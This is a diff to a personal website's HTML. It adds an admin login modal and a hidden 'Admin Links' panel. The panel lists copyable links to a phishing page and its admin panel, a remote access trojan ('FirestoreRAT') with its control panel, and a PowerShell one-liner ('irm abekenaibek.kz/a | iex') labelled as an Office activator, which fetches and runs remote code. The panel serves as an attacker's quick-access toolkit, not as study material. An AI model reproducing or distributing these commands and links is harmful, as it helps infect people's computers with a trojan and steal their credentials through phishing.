@@ -197,6 +197,14 @@
                         <button class="navbar-link" data-nav-link>Contact</button>
                     </li>
 
+                    <li class="navbar-item" id="adminNavItem" style="display:none;">
+                        <button class="navbar-link" data-nav-link>Links</button>
+                    </li>
+
+                    <li class="navbar-item">
+                        <button class="navbar-link" id="adminLoginBtn" type="button">Admin</button>
+                    </li>
+
                 </ul>
 
             </nav>
@@ -1104,14 +1112,118 @@
             </article>
 
 
+            <!--
+      - #ADMIN LINKS
+    -->
+
+            <article class="admin" data-page="links">
+
+                <header>
+                    <h2 class="h2 article-title">Admin Links</h2>
+                </header>
+
+                <section class="admin-panel">
+
+                    <p class="admin-hint">После входа админом здесь появятся ссылки с кнопками копирования.</p>
+
+                    <div class="admin-links-list">
+
+                        <div class="admin-link-row">
+                            <div class="admin-link-text">
+                                <span class="admin-link-label">Fishing URL:</span>
+                                <span class="admin-link-url">https://abekenaibek.kz/fish</span>
+                            </div>
+                            <button class="admin-copy-btn" type="button" data-copy="https://abekenaibek.kz/fish">Copy</button>
+                        </div>
+
+                        <div class="admin-link-row">
+                            <div class="admin-link-text">
+                                <span class="admin-link-label">Fishing Admin Panel:</span>
+                                <span class="admin-link-url">https://abekenaibek.kz/fishadmin</span>
+                            </div>
+                            <button class="admin-copy-btn" type="button" data-copy="https://abekenaibek.kz/fishadmin">Copy</button>
+                        </div>
+
+                        <div class="admin-link-row">
+                            <div class="admin-link-text">
+                                <span class="admin-link-label">Activation Office | Windows:</span>
+                                <span class="admin-link-url">irm abekenaibek.kz/a | iex</span>
+                            </div>
+                            <button class="admin-copy-btn" type="button" data-copy="irm abekenaibek.kz/a | iex">Copy</button>
+                        </div>
+
+                        <div class="admin-link-row">
+                            <div class="admin-link-text">
+                                <span class="admin-link-label">RAT bibon Install:</span>
+                                <span class="admin-link-url">https://github.com/bibonuwu/FirestoreRAT/releases</span>
+                            </div>
+                            <button class="admin-copy-btn" type="button" data-copy="https://github.com/bibonuwu/FirestoreRAT/releases">Copy</button>
+                        </div>
+
+                        <div class="admin-link-row">
+                            <div class="admin-link-text">
+                                <span class="admin-link-label">RAT bibon Аdmin Panel:</span>
+                                <span class="admin-link-url">https://bibonuwu.github.io/FirestoreRAT</span>
+                            </div>
+                            <button class="admin-copy-btn" type="button" data-copy="https://bibonuwu.github.io/FirestoreRAT">Copy</button>
+                        </div>
+
+                       
+
+                    </div>
+
+                    <button class="admin-logout-btn" id="adminLogoutBtn" type="button">
+                        <ion-icon name="log-out-outline"></ion-icon>
+                        <span>Logout</span>
+                    </button>
+
+                </section>
+
+            </article>
+
+
         </div>
 
     </main>
 
 
+    <!-- Admin login modal -->
+    <div class="admin-modal" id="adminModal" aria-hidden="true">
+        <div class="admin-modal-overlay" id="adminModalOverlay"></div>
+
+        <div class="admin-modal-content" role="dialog" aria-modal="true" aria-labelledby="adminModalTitle">
+            <button class="admin-modal-close" id="adminModalClose" type="button" aria-label="Close">×</button>
+
+            <h3 class="h3" id="adminModalTitle">Войти админом</h3>
+
+            <div class="admin-modal-form">
+                <label class="admin-label" for="adminLoginInput">Email</label>
+                <input class="admin-input" id="adminLoginInput" type="email" placeholder="admin@example.com" autocomplete="username">
+
+                <label class="admin-label" for="adminPassInput">Password</label>
+                <input class="admin-input" id="adminPassInput" type="password" placeholder="••••••••" autocomplete="current-password">
+
+                <button class="admin-login-submit" id="adminDoLoginBtn" type="button">
+                    <ion-icon name="log-in-outline"></ion-icon>
+                    <span>Войти</span>
+                </button>
+
+                <p class="admin-login-error" id="adminLoginError" aria-live="polite"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Copy toast -->
+    <div class="copy-toast" id="copyToast" role="status" aria-live="polite"></div>
 
 
 
+
+
+    <!-- Firebase (Auth + Firestore) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 
     <!--
       - custom js link
